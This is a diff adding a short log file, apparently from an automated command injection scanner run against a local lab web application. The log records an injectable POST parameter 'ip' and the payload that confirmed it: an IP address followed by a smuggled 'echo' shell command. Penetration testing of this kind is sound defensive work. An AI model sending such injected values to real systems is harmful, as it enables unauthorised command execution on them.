@@ -1,0 +1,9 @@
+
+=====================================
+| Started in 2026-07-17 at 23:36:41 |
+=====================================
+[info] Tested URL : http://172.18.0.4:80/vulnerabilities/exec/
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (POST) ip
+[info] Used payload: 127.0.0.1;echo QSFBND$((3%2B41))$(echo QSFBND)QSFBND
